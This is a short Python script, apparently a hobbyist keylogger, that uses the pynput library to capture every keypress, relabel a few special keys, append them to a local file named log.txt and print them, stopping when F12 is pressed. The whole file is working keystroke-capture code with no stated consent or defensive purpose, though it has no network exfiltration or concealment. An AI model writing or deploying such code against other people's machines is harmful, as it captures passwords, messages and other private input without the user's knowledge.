from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = "\nctrl\n"
    if key == "Key.enter":
        key = "\nenter\n"
    if key == "Key.alt_l":
        key = "\nalt\n"
    if key == "Key.space":
        key = "  "
    if key == "Key.shift":
        key = "\nshift\n"

    with open("log.txt", "a") as file:
        file.write(key)
    print(key)

with Listener(on_press=anonymous) as listener:
    listener.join()